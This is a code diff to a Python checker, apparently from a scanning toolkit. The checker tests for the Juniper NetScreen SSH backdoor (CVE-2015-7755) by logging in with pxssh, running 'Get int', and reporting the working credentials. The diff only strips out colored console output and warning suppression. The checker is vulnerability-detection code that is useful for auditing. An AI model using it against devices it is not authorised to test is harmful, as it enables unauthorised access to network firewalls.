@@ -7,8 +7,6 @@ author: Lucifer
 description: ssh后门。
 '''
 import sys
-import warnings
-from termcolor import cprint
 from pexpect import pxssh
 from urllib.parse import urlparse
 
@@ -43,15 +41,12 @@ class juniper_netscreen_backdoor_BaseVerify:
             s.sendline(b'Get int')
             s.prompt()
             if s.before.find(b'Interfaces')  is not -1:
-                cprint("[+]存在juniper NetScreen防火墙后门(CVE-2015-7755)漏洞...(高危)\tpayload: "+host+":"+str(port)+" "+user+":"+password, "red")
                 return True, self.url, "juniper NetScreen防火墙后门(CVE-2015-7755)", host+":"+str(port)+" "+user+":"+password, "存在juniper NetScreen防火墙后门(CVE-2015-7755)漏洞...(高危)"
             s.logout()
         except:
-            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
             return False, None, None, None, None
         return False, None, None, None, None
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = juniper_netscreen_backdoor_BaseVerify(sys.argv[1])
     testVuln.run()
